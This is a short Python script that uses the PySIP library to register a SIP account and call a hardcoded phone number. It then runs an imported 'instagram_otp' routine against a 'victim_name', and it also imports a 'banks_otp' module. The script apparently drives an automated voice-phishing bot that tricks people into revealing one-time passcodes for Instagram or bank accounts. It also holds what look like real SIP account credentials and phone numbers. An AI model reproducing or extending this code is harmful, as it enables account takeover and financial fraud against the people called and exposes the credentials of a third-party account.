import asyncio
from PySIP.sip_account import SipAccount
from scripts.banks_otp import bank_script
from scripts.instagram_otp import instagram_script

# account = SipAccount('3001', '30013001', '192.168.1.112:5060')
account = SipAccount('12035473096', 'etAywogjnDHPUbfoUY2tovgQ2ekZZM93/LBeO1B9dbGTt7pCXLG7esa8A5pa5/8DY2dDH2LXtKsIyc1pE1YfuA==', 'talk.waafi.com:2382', connection_type='TLSv1')

# call = account.make_call('12045148765')
# print(call)


async def main():
    await account.register()
    
    call = account.make_call('252636321503')
    call_task = asyncio.create_task(call.start())

    await instagram_script(
        call.call_handler,
        victim_name="John"
    )

    await call_task
    await asyncio.sleep(3)
    await account.unregister()


if __name__ == "__main__":
    asyncio.run(main())
    # loop.run_until_complete(asyncio.sleep(2))
    # account.unregister_sync()
    # loop.close()
